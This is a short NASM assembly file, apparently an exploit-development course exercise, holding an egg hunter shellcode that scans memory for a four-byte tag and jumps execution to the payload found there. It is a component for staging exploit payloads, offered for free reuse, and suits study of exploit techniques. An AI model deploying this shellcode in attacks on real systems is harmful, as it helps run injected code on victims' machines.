; egghunter.nasm
; 
; A Egg hunter shellcode
;
; Author: SLAE - 891
;
; You are free to use and/or redistribute it without restriction

global  _start

section .text
_start:

	mov eax, _start				; we set a valid .text address into eax
	mov ebx, dword 0x50905091	; we can avoid an 8 bytes tag in egg if the tag
    dec ebx						; can not be found in the egg hunter, that's why we decrement to look for 
    							; 0x50905090 - push eax, nop, push eax, nop

next_addr:

	inc eax
    cmp dword [eax], ebx		; do we found the tag ?
    jne next_addr
    jmp eax						; yes we do so we jump to the egg

